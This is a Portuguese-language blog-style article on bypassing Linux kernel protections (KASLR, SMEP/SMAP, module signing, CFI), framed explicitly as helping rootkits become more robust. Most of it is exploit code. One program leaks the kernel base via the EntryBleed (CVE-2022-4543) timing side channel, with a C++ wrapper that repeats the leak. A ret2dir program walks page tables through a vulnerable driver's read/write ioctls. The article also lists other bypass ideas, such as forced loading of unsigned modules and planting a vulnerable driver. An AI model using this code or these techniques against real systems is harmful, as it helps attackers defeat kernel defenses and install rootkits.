---
title: "Kernel Linux Bypass"
author: "black0ut"
---

**lights off & black0ut on**

### 1- Introdução
Olá, Sejam bem vindos!!!
Nesse artigo vou abordar como as proteções modernas no Kernel Linux atrapalham e mitigam as funções de rootkits e claro como ocorre o seu bypass.

### 2- Kernel Address Space Layout Randomization (KASLR)

Sendo uma das principais formas de defesa do Kernel e em outros sistemas, ocorre a randomização dos endereços de memória do kernel em cada boot dificultando assim a exploração do atacante. Em rootkits isto é prejudicial por conta da randomização da **sys_call_table**, acarretando que hooks em syscalls sejam mais difíceis, devido ao seu endereço de memória aleatório.

Para contornar esse sistema existem alguns métodos, como por exemplo:  

**A CVE-2022-4543**, também conhecida como **EntryBleed**, é uma vulnerabilidade no mecanismo de segurança **Kernel Page Table Isolation** (KPTI) do Linux, que permite a um atacante local vazar o endereço base do **KASLR** (Kernel Address Space Layout Randomization) em sistemas Intel. Essa falha explora um canal lateral baseado em temporização do TLB (Translation Lookaside Buffer) para obter informações sensíveis do kernel, comprometendo a aleatorização de memória crítica, por meio do mapeamento da **entry_SYSCALL_64**, que possui o mesmo endereço no espaço de uer e no espaço do kernel, dessa forma podemos usar o **prefetchnta e prefetcht2** são usadas para medir o tempo de acesso a endereços específicos, conseguindo obter o endereço da syscall, esa falha ocorre principalmente em processadores intel, segue abaixo um exploit para exploração dessa vulnerabilidade:

![1](https://dl.acm.org/cms/attachment/html/10.1145/3623652.3623669/assets/html/images/hasp23-6-fig1.jpg)


### Arquivo:"entryBleed_main.c" 
```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100

uint64_t leak_syscall_entry(unsigned long long offset)
{
    unsigned long long STEP = 0x100000ull;
    unsigned long long SCAN_START = 0xffffffff80000000ull + offset, SCAN_END = 0xffffffffc0000000ull + offset;
    unsigned long long ARR_SIZE = (SCAN_END - SCAN_START) / STEP;

    uint64_t *data = (uint64_t *)malloc(sizeof(uint64_t) * ARR_SIZE);
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    return addr;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        puts("[*] Usage: ./binary entry_SYSCALL_64_offset(in hex)");
        return -1;
    }

    char *p_end;

    unsigned long long entry_SYSCALL_64_offset = strtoull(argv[1], &p_end, 16);

    printf("%llx", leak_syscall_entry(entry_SYSCALL_64_offset) - entry_SYSCALL_64_offset);

    return 0;
}

```



### Arquivo:"entryBleed_cpp.cpp"
```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <string>
#include <map>

using namespace std;

void execute_cmd(const char *cmd, char *result)
{
    char buf_ps[1024];
    char ps[1024] = {0};
    FILE *ptr;
    strcpy(ps, cmd);
    if ((ptr = popen(ps, "r")) != NULL)
    {
        while (fgets(buf_ps, 1024, ptr) != NULL)
        {
            strcat(result, buf_ps);
            if (strlen(result) > 1024)
                break;
        }
        pclose(ptr);
        ptr = NULL;
    }
    else
    {
        printf("popen %s error\n", ps);
    }
}

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        puts("[*] Usage: ./binary dekaslr_path entry_SYSCALL_64_offset(in hex) max_loop");
        return -1;
    }

    string dekaslr_path = argv[1];
    string koffset = argv[2];
    string max_loop = argv[3];
    string cmd = dekaslr_path + " " + koffset;

    char result[0x1000] = {0};
    int max_tries = stoi(max_loop);

    map<string, unsigned int> base_record;

    for (size_t i = 0; i < max_tries; i++)
    {
        memset(result, 0, 0x100);
        execute_cmd(cmd.c_str(), result);
        // printf("%s\n", result);
        string key = result;
        if (base_record.find(key) != base_record.end())
        {
            base_record[key]++;
        }
        else
        {
            base_record[key] = 1;
        }
    }

    map<string, unsigned int>::iterator iter;
    unsigned int max_cnt = 0;

    for (iter = base_record.begin(); iter != base_record.end(); iter++)
    {
        if (iter->second > max_cnt)
        {
            max_cnt = iter->second;
        }
    }

    string kernel_base;
    for (iter = base_record.begin(); iter != base_record.end(); iter++)
    {
        if (iter->second == max_cnt)
        {
            kernel_base = iter->first;
            cout << "0x" << kernel_base << ": " << max_cnt << "/" << max_tries << endl;
            break;
        }
    }

    return 0;
}
```




### 3- Supervisor Mode Execution Prevention (SMEP) e Supervisor Mode Access Prevention (SMAP)

Mais um sistema de proteção de mecanismos de segurança baseados em hardware (CPU) que protegem o kernel de ataques que tentam explorar a interação entre o modo kernel (privilegiado) e o modo usuário (não privilegiado)

O **SMEP** impede que o kernel execute código localizado na memória do espaço do usuário (userland) e bloqueia ataques que tentam redirecionar a execução do kernel para código malicioso residente em regiões não privilegiadas por meio do registrador CR4 (x86_64): O bit 20 do registrador CR4 controla o **SMEP**. Se habilitado, a CPU gera uma exceção (General Protection Fault, #GP) se o kernel tentar executar instruções em páginas de memória marcadas como "userland" (não privilegiadas). Marcação de páginas: O bit User/Supervisor (bit 2) na entrada da tabela de páginas (PTE) define se uma página pertence ao usuário (U=1) ou ao kernel (U=0). Isto se torna complicado para rootkits pois  bloqueia a injeção de shellcode em userland e exige que rootkits usem técnicas mais complexas como ROP 

O **SMAP** bloqueia o acesso do kernel a páginas de memória do espaço do usuário durante operações privilegiadas e impede que dados controlados pelo usuário sejam usados para corromper estruturas do kernel ou vazar informações sensíveis. Como funciona no low level?

* `stac (Set AC Flag):` Permite temporariamente acesso a userland (usado em funções como  copy_from_user).
* `clac (Clear AC Flag):` Restaura a proteção do SMAP.
* `AC Flag:` Quando SMAP está ativo, a CPU verifica a flag AC (bit 18 no registrador RFLAGS). Se AC=0, acessos a Userland são bloqueados.  


E rootkits isto é péssimo pois impede que rootkits usem dados do userland para manipular o kernel dificulta ataques de corrupção de memória que dependem de ponteiros controlados pelo usuário.
Uma das formas de contornar esses sistemas é por meio ret2dir, dessa forma o atacante aloca grandes quantidades de memória no espaço do usuário, forçando o kernel a mapear essas páginas no **physmap**. Como o physmap é compartilhado entre userland e kernel, dados controlados pelo atacante podem residir em endereços conhecidos do kernel. O atacante aloca múltiplas páginas na userland, via mmap e as preenche com código malicioso (shellcode). isto é útil pois o SMAP e SMEP não impedem a execução do physmap. segue abaixo um código com esse objetivo:

![ret2dir](https://figures.semanticscholar.org/1de5ae8534fc76323e4d926e10dc0fc76a28a361/5-Figure2-1.png)



### Arquivo:"ret2dir.c" 
```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333
#define VULN_PGD 0x4444

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
    	perror("open");
    	exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
    	perror("ioctl");
    	exit(-1);
	}
}

unsigned long read64(unsigned long kaddr) {

	struct rwRequest req;
	unsigned long value;;

	req.uaddr = &value;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_READ, &req) < 0) {
    	perror("ioctl");
    	exit(-1);
	}
	return value;
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
    	perror("ioctl");
    	exit(-1);
	}

	return stack;
}

unsigned long leak_pgd() {
	struct rwRequest req;
	unsigned long pgd = 0xcccccccc;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &pgd;
	if (ioctl(fd, VULN_PGD, &req) < 0) {
    	perror("ioctl");
    	exit(-1);
	}

	return pgd;
}

unsigned long find_synonym(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;

	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
    
	unsigned long lv1 = read64(pgdir + index1*8);
	if (!lv1) {
    	printf("[!] lv1 is invalid\n");
    	exit(-1);
	}
	printf("lv1: %lx\n", lv1);
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2*8);
	if (!lv2) {
    	printf("[!] lv2 is invalid\n");
    	exit(-1);
	}
	printf("lv2: %lx\n", lv2);
    
	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3*8);
	if (!lv3) {
    	printf("[!] lv3 is invalid\n");
    	exit(-1);
	}
	printf("lv3: %lx\n", lv3);

	unsigned long lv4 = read64((((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8);
	if (!lv4) {
    	printf("[!] lv3 is invalid\n");
    	exit(-1);
	}
	printf("lv4: %lx\n", lv4);
    
	unsigned long vaddr_alias = (((lv4 >> 12) & 0x3fffffff) << 12) + pageOffsetBase;
	return vaddr_alias;
}

unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;

	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
    
	unsigned long lv1 = read64(pgdir + index1*8);
	if (!lv1) {
    	printf("[!] lv1 is invalid\n");
    	exit(-1);
	}
	printf("lv1: %lx\n", lv1);
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2*8);
	if (!lv2) {
    	printf("[!] lv2 is invalid\n");
    	exit(-1);
	}
	printf("lv2: %lx\n", lv2);
    
	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3*8);
	if (!lv3) {
    	printf("[!] lv3 is invalid\n");
    	exit(-1);
	}
	printf("lv3: %lx\n", lv3);

	unsigned long lv4 = read64((((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8);
	if (!lv4) {
    	printf("[!] lv3 is invalid\n");
    	exit(-1);
	}
	printf("lv4: %lx\n", lv4);
    
	unsigned long vaddr_alias = (((lv4 >> 12) & 0x3fffffff) << 12) + pageOffsetBase;
	printf("vaddr alias page: %p\n", (void *)vaddr_alias);
	unsigned long pte_addr = (((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8;
	printf("pte address: %p\n", (void *)pte_addr);
    
	return pte_addr;
}

int main (int argc, char **argv){
    
	void *rwx = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (rwx == MAP_FAILED) {
    	perror("mmap");
    	exit(-1);
	}

	void *rw = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (rw == MAP_FAILED) {
    	perror("mmap");
    	exit(-1);
	}

	memset(rwx, 0xcc, 0x1000);
	memset(rw, 0xcc, 0x1000);

	unsigned long pgd = leak_pgd();

	printf("[*] page directory is at: %p\n", (void *)pgd);

	unsigned long rwx_pte = pageTableWalk(pgd, find_synonym(pgd,rwx));
	unsigned long rw_pte = pageTableWalk(pgd, find_synonym(pgd,rw));


	printf("[*] RWX: %lx\n", read64(rwx_pte));
	printf("[*] RW : %lx\n", read64(rw_pte));
	return 0;
}
```



### 4- Assinaturas módulo de Kernels

A Assinatura de Módulos do Kernel (com SHA-512 como padrão) é um mecanismo de segurança integrado ao Linux que garante que apenas módulos do kernel (arquivos .ko) assinados digitalmente por uma chave confiável possam ser carregados. Esse recurso é essencial para evitar a injeção de código malicioso (como rootkits) ou módulos não autorizados no kernel, especialmente em sistemas com Secure Boot habilitado.

#### As formas de bypass incluem:

**Secure Boot Desabilitado**: Módulos não assinados podem ser carregados via `insmod --force` 
**Chaves Personalizadas**: Sistemas podem usar chaves locais, mas isso exige recompilar o kernel.
instalar um driver com falhas que podem ser explorados, basicamente a instalação de uma vulnerabilidade na máquina (ex: CVE-2021-3490).  

### 5-  Integridade de Fluxo de Controle (CFI) 
é um mecanismo de segurança que é configurado para proteger programas e sistemas contra explorações que descarrilam o fluxo de execução legítimo, como **Programação Orientada a Retorno** (ROP) e Programação Orientada a Salto (JOP). Ele garante que o fluxo de controle (chamadas de função, retornos, saltos) tome apenas caminhos predefinidos válidos, evitando assim que invasores sequestrem a execução para código malicioso. Para contornar esse sistema existem as seguintes tecnicas:


* A. Ataques a Implementações "Coarse-Grained"  
**Problema**: CFI "coarse-grained" agrupa muitos destinos válidos em categorias amplas.  
**Exemplo**: Se todas as funções que retornam int forem consideradas válidas, um atacante pode redirecionar para qualquer uma delas.  
**Ferramentas Afetadas:** Versões antigas do Clang CFI e Microsoft CFG.

* B. Memory Corruption Primitive + CFI Weakening  
**Mecanismo**: Combinar corrupção de memória (ex: buffer overflow) com falhas no CFI.  
**Exemplo**: Corromper uma estrutura de dados (ex: struct file_operations) para redirecionar fluxo para gadgets permitidos pelo CFI.  
**Caso**: WarpAttack usou double-fetches (acessos duplos à memória) para criar condições de corrida e burlar verificações.

* C. ROP/JOP Dentro de Limites Permitidos  
**Mecanismo**: Construir cadeias ROP/JOP usando apenas gadgets em regiões marcadas como válidas pelo CFI.  
**Exemplo**: Counterfeit Object-Oriented Programming (COOP) usa chamadas legítimas de objetos para atingir fins maliciosos.  

* D. Abuso de APIs ou Funções Legítimas  
**Mecanismo**: Chamar funções válidas do sistema com argumentos manipulados.  
**Exemplo**: Usar system() ou execve() com parâmetros controlados pelo atacante.  
Desta forma podemos fazer nosso rootkit  ficar mais sofisticado e robusto.

### 6- Conclusão
concluo esse artigo afirmando que o Kernel hacking é uma área extremamente grande, e que é uma guerra constante na sostificação de defesas contra os atacantes, e o conteúdo mostrado se refere a algumas técnicas para contornar as defesas do Kernel Linux, portanto há inúmeras maneiras de se fazer isso. Então é isso muito obrigado!!!

**lights on & black0ut out**


